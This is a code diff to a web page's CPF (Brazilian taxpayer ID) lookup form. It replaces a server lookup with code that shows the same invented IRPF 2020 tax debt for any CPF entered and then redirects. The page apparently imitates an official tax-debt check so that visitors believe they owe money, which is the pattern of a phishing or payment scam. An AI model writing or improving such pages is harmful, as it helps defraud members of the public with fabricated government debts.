@@ -1202,64 +1202,17 @@
                     btn.disabled = true;
                     btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Consultando...';
 
-                    // API de CPFs cadastrados
-                    const apiData = {
-                        "86465465465": {
-                            nome: "MARIA SILVA",
-                            cpf: "864.654.654-65",
-                            situacao: "REGULAR",
-                            debitos: [
-                                { tipo: "IRPF 2020", valor: 101.82, vencimento: "15/12/2024" }
-                            ]
-                        },
-                        "12345678900": {
-                            nome: "JOÃO DA SILVA SANTOS",
-                            cpf: "123.456.789-00",
-                            situacao: "REGULAR",
-                            debitos: [
-                                { tipo: "IPTU 2024", valor: 250.00, vencimento: "10/01/2025" }
-                            ]
-                        },
-                        "52998224725": {
-                            nome: "PEDRO HENRIQUE OLIVEIRA",
-                            cpf: "529.982.247-25",
-                            situacao: "REGULAR",
-                            debitos: [
-                                { tipo: "IRPF 2021", valor: 350.00, vencimento: "30/04/2025" }
-                            ]
-                        }
+                    // Salva dados no localStorage e redireciona
+                    const customerData = {
+                        nome: "MARIA SILVA",
+                        cpf: cpfInput.value,
+                        situacao: "REGULAR",
+                        debitos: [
+                            { tipo: "IRPF 2020", valor: 101.82, vencimento: "15/12/2024" }
+                        ]
                     };
-
-                    // Consulta API do servidor local
-                    try {
-                        const resp = await fetch('/api/consulta-cpf', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ cpf: cpfValue })
-                        });
-
-                        const data = await resp.json();
-
-                        if (!resp.ok) {
-                            cpfInput.style.borderColor = '#dc3545';
-                            cpfError.textContent = 'CPF inválido. Tente novamente';
-                            cpfError.style.display = 'block';
-                            btn.disabled = false;
-                            btn.innerHTML = originalText;
-                            return;
-                        }
-
-                        // CPF existe - salva dados e redireciona
-                        localStorage.setItem('customerData', JSON.stringify(data));
-                        window.location.href = '86465465465.html';
-                    } catch (err) {
-                        // Servidor offline
-                        cpfInput.style.borderColor = '#dc3545';
-                        cpfError.textContent = 'CPF inválido. Tente novamente';
-                        cpfError.style.display = 'block';
-                        btn.disabled = false;
-                        btn.innerHTML = originalText;
-                    }
+                    localStorage.setItem('customerData', JSON.stringify(customerData));
+                    window.location.href = '86465465465.html';
                 });
             }
         });
